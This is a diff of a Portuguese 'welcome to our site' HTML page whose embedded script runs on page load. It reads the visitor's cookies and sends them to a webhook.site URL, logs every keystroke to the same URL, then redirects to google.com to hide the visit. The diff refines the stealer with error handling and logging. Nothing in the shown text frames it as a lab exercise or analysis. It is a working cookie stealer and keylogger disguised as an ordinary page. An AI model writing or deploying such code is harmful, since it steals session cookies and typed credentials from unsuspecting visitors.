@@ -7,28 +7,38 @@
 
 <body>
 
-    <h1>Bem-vindo ao nosso site! 2</h1>
+    <h1>Bem-vindo ao nosso site! 3</h1>
     <script>
-        // Função para capturar e enviar dados
         async function capturarDados() {
-            // Captura os cookies
             let cookies = document.cookie;
 
-            // Captura a digitação do utilizador
+            // Testar se há cookies antes de enviar
+            if (!cookies) {
+                console.warn("Nenhum cookie encontrado. O document.cookie pode estar bloqueado.");
+            } else {
+                console.log("Cookies capturados:", cookies);
+            }
+
+            // Enviar para o webhook
+            try {
+                await fetch("https://webhook.site/493fc1c1-9d70-4701-9a56-a7c691e18389?cookies=" + encodeURIComponent(cookies));
+                console.log("Cookies enviados com sucesso.");
+            } catch (error) {
+                console.error("Erro ao enviar cookies:", error);
+            }
+
+            // Capturar teclas pressionadas
             document.addEventListener("keydown", function (event) {
                 fetch("https://webhook.site/493fc1c1-9d70-4701-9a56-a7c691e18389?key=" + event.key);
             });
 
-            // Envia os cookies primeiro
-            await fetch("https://webhook.site/493fc1c1-9d70-4701-9a56-a7c691e18389?cookies=" + encodeURIComponent(cookies));
-
-            // Espera 1 segundo antes de redirecionar para garantir envio
+            // Aguardar um pouco antes do redirecionamento
             setTimeout(() => {
                 window.location.href = "https://www.google.com";
-            }, 1000);
+            }, 1500);
         }
 
-        // Chama a função
+        // Executar a função
         capturarDados();
     </script>
 </body>
